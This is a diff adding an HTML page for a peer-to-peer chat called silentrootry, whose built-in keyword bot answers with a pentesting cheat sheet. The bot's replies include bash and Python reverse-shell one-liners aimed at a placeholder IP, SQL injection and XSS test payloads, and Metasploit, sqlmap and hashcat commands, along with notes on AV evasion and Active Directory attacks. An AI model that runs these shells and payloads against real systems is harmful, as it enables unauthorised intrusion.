@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+    <title>silentrootry — P2P Chat</title>
+    <script src="https://unpkg.com/peerjs@1.5.1/dist/peerjs.min.js"></script>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            background:#0a0a0f;color:#c0c0c0;
+            font-family:'JetBrains Mono',monospace;
+            min-height:100vh;display:flex;align-items:center;justify-content:center;
+            overflow:hidden
+        }
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
+
+        .container{
+            width:100%;max-width:680px;height:100vh;max-height:700px;
+            display:flex;flex-direction:column;
+            padding:16px;gap:10px;
+        }
+
+        .header{
+            text-align:center;padding:8px 0 4px;
+            border-bottom:1px solid #1a1a2e;
+        }
+        .header .name{
+            font-size:1.3rem;font-weight:700;color:#00ff88;
+            text-shadow:0 0 12px rgba(0,255,136,0.3);
+            letter-spacing:4px;text-transform:uppercase;
+        }
+        .header .sub{
+            font-size:0.6rem;color:#2a2a3e;letter-spacing:2px;margin-top:2px;
+        }
+
+        .status{
+            font-size:0.6rem;color:#2a2a3e;text-align:center;
+            display:flex;justify-content:center;gap:16px;padding:2px 0;
+        }
+        .status .green{color:#00ff88}
+        .blink{animation:blink 1.2s step-end infinite}
+        @keyframes blink{50%{opacity:0.2}}
+
+        .chat-box{
+            flex:1;background:#0e0e18;border:1px solid #1a1a2e;border-radius:4px;
+            padding:12px;overflow-y:auto;display:flex;flex-direction:column;gap:8px;
+        }
+        .chat-box::-webkit-scrollbar{width:4px}
+        .chat-box::-webkit-scrollbar-track{background:#0a0a0f}
+        .chat-box::-webkit-scrollbar-thumb{background:#1a1a2e;border-radius:2px}
+
+        .msg{
+            padding:6px 10px;border-radius:4px;max-width:88%;
+            font-size:0.75rem;line-height:1.5;word-break:break-word
+        }
+        .msg .s{font-size:0.55rem;text-transform:uppercase;letter-spacing:1px;opacity:0.6;margin-bottom:2px}
+        .msg.self{background:#00ff880e;border:1px solid #00ff8820;align-self:flex-end}
+        .msg.self .s{color:#00ff88}
+        .msg.other{background:#0e0e18;border:1px solid #1a1a2e;align-self:flex-start}
+        .msg.other .s{color:#6b7280}
+        .msg.bot{background:#1a0a2e;border:1px solid #ff004033;align-self:flex-start}
+        .msg.bot .s{color:#ff0040}
+        .msg .hl{color:#00ff88}
+
+        .input-area{
+            display:flex;gap:8px;
+        }
+        .input-area input{
+            flex:1;background:#0e0e18;border:1px solid #1a1a2e;color:#e0e0e0;
+            font-family:'JetBrains Mono',monospace;padding:10px 12px;border-radius:4px;
+            font-size:0.8rem;outline:none;
+        }
+        .input-area input:focus{border-color:#00ff8866}
+        .input-area button{
+            background:transparent;border:1px solid #00ff88;color:#00ff88;
+            font-family:'JetBrains Mono',monospace;padding:10px 16px;border-radius:4px;
+            font-size:0.7rem;text-transform:uppercase;cursor:pointer;
+            transition:all 0.3s;white-space:nowrap;
+        }
+        .input-area button:hover{background:#00ff88;color:#0a0a0f}
+
+        .footer-info{
+            font-size:0.55rem;color:#1a1a2e;text-align:center;padding:4px 0;
+        }
+
+        .users{
+            display:flex;flex-wrap:wrap;gap:4px;justify-content:center;
+            font-size:0.6rem;color:#6b7280;padding:2px 0;
+        }
+        .users .tag{
+            background:#0e0e18;border:1px solid #1a1a2e;padding:1px 8px;border-radius:8px;
+            color:#00ff88;font-size:0.55rem;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <div class="name">// silentrootry</div>
+        <div class="sub">P2P Encrypted Chat · AI Assistant</div>
+        <div class="status">
+            <span><span class="green blink">●</span> LIVE</span>
+            <span>🔗 <span class="green" id="peerCount">0</span> peers</span>
+            <span>ID: <span class="green" id="myPeerId">—</span></span>
+        </div>
+    </div>
+
+    <div class="users" id="onlineUsers">
+        <span class="green" id="youLabel">you</span>
+    </div>
+
+    <div class="chat-box" id="chatBox">
+        <div class="msg bot">
+            <div class="s">🤖 SILENTROOTRY AI</div>
+            Welcome to <span class="hl">silentrootry</span>'s P2P Chat.<br>
+            Ask me anything about hacking or type <span class="hl">!help</span>
+        </div>
+    </div>
+
+    <div class="input-area">
+        <input type="text" id="chatInput" placeholder="Ask the AI or chat with peers..." autocomplete="off" />
+        <button onclick="sendMsg()">Send</button>
+    </div>
+    <div class="footer-info">⚡ 100% P2P · Zero logs · Direct browser-to-browser</div>
+</div>
+
+<script>
+    // ===== P2P CHAT =====
+    const chatBox = document.getElementById('chatBox');
+    const chatInput = document.getElementById('chatInput');
+    const peerCountEl = document.getElementById('peerCount');
+    const myPeerIdEl = document.getElementById('myPeerId');
+    const onlineUsersEl = document.getElementById('onlineUsers');
+    const youLabel = document.getElementById('youLabel');
+
+    let peer, myId;
+    const connections = {};
+    let userName = '';
+
+    function genName(){
+        const p=['gh0st','x0r','null','root','dark','crypt','hex','0x','bin','void'];
+        const s=['h4x0r','s33k','byte','shift','pwn','blade','sp00k','walk3r','kn1ght','c0d3r'];
+        return p[Math.floor(Math.random()*p.length)]+'_'+s[Math.floor(Math.random()*s.length)]+Math.floor(Math.random()*99);
+    }
+    userName = genName();
+    youLabel.textContent = userName + ' (you)';
+
+    function initPeer(){
+        peer = new Peer(undefined, {debug:0});
+        peer.on('open', id => {
+            myId = id;
+            myPeerIdEl.textContent = id.substring(0,8)+'...';
+            setTimeout(() => {
+                addBotMsg('🔗 Connected! Share this ID: <span class="hl">'+id+'</span>');
+                addBotMsg('💡 Use <span class="hl">!connect &lt;ID&gt;</span> to chat with someone');
+                updatePeers();
+            }, 300);
+        });
+        peer.on('connection', conn => setupConn(conn));
+        peer.on('error', () => {});
+    }
+
+    function setupConn(conn){
+        const pid = conn.peer;
+        connections[pid] = conn;
+        conn.on('open', ()=>{
+            conn.send({type:'info', name:userName, id:myId});
+            addBotMsg('👤 <span class="hl">'+pid.substring(0,8)+'...</span> joined');
+            updatePeers(); updateUsers();
+        });
+        conn.on('data', data=>{
+            if(data.type==='info'){ connections[pid].displayName=data.name; updateUsers(); return; }
+            if(data.type==='msg') showMsg(data.name||pid.substring(0,8), data.text, false);
+        });
+        conn.on('close', ()=>{ delete connections[pid]; addBotMsg('👋 Peer left'); updatePeers(); updateUsers(); });
+    }
+
+    function updatePeers(){
+        const c = Object.keys(connections).length;
+        peerCountEl.textContent = c;
+    }
+
+    function updateUsers(){
+        const users = [userName];
+        for(let p in connections){
+            const c = connections[p];
+            users.push(c.displayName || p.substring(0,8)+'...');
+        }
+        onlineUsersEl.innerHTML = users.map(u=>'<span class="tag">'+u+'</span>').join(' ');
+    }
+
+    function broadcast(text){
+        for(let p in connections){ try{ connections[p].send({type:'msg', name:userName, text}); }catch(e){} }
+    }
+
+    function sendMsg(){
+        const text = chatInput.value.trim();
+        if(!text) return;
+        chatInput.value = '';
+        if(text.startsWith('!')){ handleCmd(text); return; }
+        showMsg('You', text, true);
+        broadcast(text);
+        const isQ = text.includes('?') || text.toLowerCase().startsWith('how')||text.toLowerCase().startsWith('what')||text.toLowerCase().includes('hack')||text.toLowerCase().includes('sql')||text.toLowerCase().includes('xss')||text.toLowerCase().includes('exploit')||text.toLowerCase().includes('shell')||text.toLowerCase().includes('scan')||text.toLowerCase().includes('tool')||text.toLowerCase().includes('nmap')||text.toLowerCase().includes('password')||text.toLowerCase().includes('metasploit');
+        if(isQ || text.length>12){
+            setTimeout(()=>{
+                const r = getAI(text);
+                if(r) addBotMsg(r);
+            }, 400);
+        }
+    }
+
+    function showMsg(sender, text, self){
+        const d = document.createElement('div');
+        d.className = 'msg '+(self?'self':'other');
+        d.innerHTML = '<div class="s">'+esc(sender)+'</div>'+esc(text);
+        chatBox.appendChild(d);
+        chatBox.scrollTop = chatBox.scrollHeight;
+    }
+
+    function addBotMsg(t){
+        const d = document.createElement('div');
+        d.className = 'msg bot';
+        d.innerHTML = '<div class="s">🤖 SILENTROOTRY AI</div>'+t;
+        chatBox.appendChild(d);
+        chatBox.scrollTop = chatBox.scrollHeight;
+    }
+
+    function esc(t){ const d=document.createElement('div'); d.textContent=t; return d.innerHTML; }
+
+    function handleCmd(cmd){
+        const p = cmd.split(' ');
+        switch(p[0].toLowerCase()){
+            case '!help':
+                addBotMsg(`📋 <b>Commands:</b><br>
+                <span class="hl">!connect &lt;ID&gt;</span> — Connect to peer<br>
+                <span class="hl">!peers</span> — List peers<br>
+                <span class="hl">!name &lt;x&gt;</span> — Change name<br>
+                <span class="hl">!clear</span> — Clear chat<br>
+                <span class="hl">!whoami</span> — Your info<br><br>
+                💡 Or just ask me about hacking!`);
+                break;
+            case '!connect':
+                const id = p[1];
+                if(!id){ addBotMsg('⚠️ !connect &lt;peerID&gt;'); return; }
+                if(connections[id]){ addBotMsg('⚠️ Already connected'); return; }
+                if(id===myId){ addBotMsg('😂 Can\'t connect to yourself'); return; }
+                const c = peer.connect(id,{reliable:true});
+                setupConn(c);
+                addBotMsg('🔗 Connecting...');
+                break;
+            case '!peers':
+                const list = Object.keys(connections);
+                if(!list.length) addBotMsg('📡 No peers. Share your ID: <span class="hl">'+myId+'</span>');
+                else addBotMsg('📡 Peers ('+list.length+'):<br>'+list.map(x=>'• '+x.substring(0,16)+'...').join('<br>'));
+                break;
+            case '!name':
+                const n = p.slice(1).join(' ');
+                if(n){ userName=n; for(let x in connections){ try{connections[x].send({type:'info',name:userName,id:myId});}catch(e){} } updateUsers(); addBotMsg('✅ Name: <span class="hl">'+esc(n)+'</span>'); }
+                else addBotMsg('⚠️ !name &lt;name&gt;');
+                break;
+            case '!clear': chatBox.innerHTML=''; addBotMsg('🧹 Cleared'); break;
+            case '!whoami':
+                addBotMsg(`👤 <b>You:</b><br>Name: <span class="hl">${esc(userName)}</span><br>ID: <span class="hl">${myId}</span><br>Peers: ${Object.keys(connections).length}`);
+                break;
+            default:
+                const r = getAI(cmd);
+                if(r) addBotMsg(r);
+                else addBotMsg('⚠️ Unknown. Try <span class="hl">!help</span>');
+        }
+    }
+
+    chatInput.addEventListener('keydown', e=>{ if(e.key==='Enter') sendMsg(); });
+
+    // ===== AI =====
+    function getAI(q){
+        const l = q.toLowerCase();
+        const db = [
+            {k:['sql injection','sqli','sqlmap'],r:'🔍 <b>SQL Injection:</b><br>Try: <code>\' OR 1=1 --</code><br>Tool: <span class="hl">sqlmap -u "http://target.com/page?id=1" --batch</span><br>Fix: Prepared statements'},
+            {k:['xss','cross site'],r:'🔥 <b>XSS:</b><br>Test: <code>&lt;img src=x onerror=alert(1)&gt;</code><br>Types: Reflected, Stored, DOM<br>Fix: Output encoding, CSP header'},
+            {k:['nmap','scan','port'],r:'📡 <b>Nmap:</b><br><code>nmap -sV target.com</code> — Services<br><code>nmap -p- target.com</code> — All ports<br><code>nmap -sS target.com</code> — Stealth scan'},
+            {k:['reverse shell','shell','payload'],r:'🎯 <b>Reverse Shell:</b><br>Bash: <code>bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1</code><br>Python: <code>python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")\'</code>'},
+            {k:['metasploit','msf'],r:'💀 <b>Metasploit:</b><br><code>msfconsole</code><br><code>search exploit</code><br><code>use exploit/multi/handler</code><br><code>set PAYLOAD windows/meterpreter/reverse_tcp</code>'},
+            {k:['privilege','privesc','escalation'],r:'⬆️ <b>PrivEsc:</b><br>Linux: <code>sudo -l</code>, <code>find / -perm -4000</code><br>Windows: <code>whoami /priv</code>, <code>systeminfo</code><br>Tools: LinPEAS, WinPEAS'},
+            {k:['bloodhound','active directory','ad'],r:'🕸️ <b>BloodHound:</b><br>Collect: <code>SharpHound.exe -c All</code><br>Attacks: Kerberoasting, DCSync, ACL abuse'},
+            {k:['password','hashcat','hash','crack'],r:'🔑 <b>Hashcat:</b><br><code>hashcat -m 1000 hash.txt rockyou.txt</code> — NTLM<br><code>hashcat -m 13100 hash.txt rockyou.txt</code> — Kerberoast'},
+            {k:['burp'],r:'🕵️ <b>Burp Suite:</b><br>Proxy: 127.0.0.1:8080<br>Repeater, Intruder, Decoder'},
+            {k:['google dork','dorks'],r:'📋 <b>Google Dorks:</b><br><code>site:target.com filetype:pdf</code><br><code>intitle:"index of"</code><br><code>inurl:admin</code>'},
+            {k:['c2','cobalt','sliver','command'],r:'🎮 <b>C2 Frameworks:</b><br>Sliver, Havoc, Mythic, Cobalt Strike<br>Features: Beacons, socks, lateral movement'},
+            {k:['evasion','bypass','av','edr','defender'],r:'🛡️ <b>AV Evasion:</b><br>Shellcode encryption, syscalls, DLL unhooking<br>AMSI patching, LOLBins, process injection'},
+            {k:['osint','recon','info'],r:'🔎 <b>OSINT:</b><br>theHarvester, Shodan, Recon-ng<br>Google Dorks, Whois, Wayback Machine'},
+            {k:['docker','container','escape'],r:'🐳 <b>Docker Escape:</b><br>Check: <code>ls /var/run/docker.sock</code><br>Abuse: Mounted socket, --privileged, CAP_SYS_ADMIN'},
+            {k:['ffuf','gobuster','dirb','fuzzing','directory'],r:'🔍 <b>Fuzzing:</b><br><span class="hl">ffuf</span>: <code>ffuf -u https://target/FUZZ -w wordlist.txt</code><br><span class="hl">gobuster</span>: <code>gobuster dir -u https://target -w wordlist.txt</code>'},
+            {k:['hello','hi','hey','sup'],r:'Hey! 👋 Ask me about:<br>SQLi, XSS, reverse shells, nmap, Metasploit, priv esc, OSINT, password cracking, AD, C2, evasion, fuzzing...'},
+            {k:['who are you','who is silent'],r:'I\'m the <b>silentrootry AI Assistant</b> 🤖 Built into this P2P chat. Ask me anything about ethical hacking, pentesting, and cybersecurity!'}
+        ];
+        for(let item of db){
+            for(let kw of item.k){
+                if(l.includes(kw)) return item.r;
+            }
+        }
+        if(l.length>3) return '🤔 Ask about: SQLi, XSS, nmap, reverse shells, Metasploit, priv esc, OSINT, password cracking, AD, C2, evasion, fuzzing... Or type <span class="hl">!help</span>';
+        return null;
+    }
+
+    initPeer();
+</script>
+</body>
+</html>
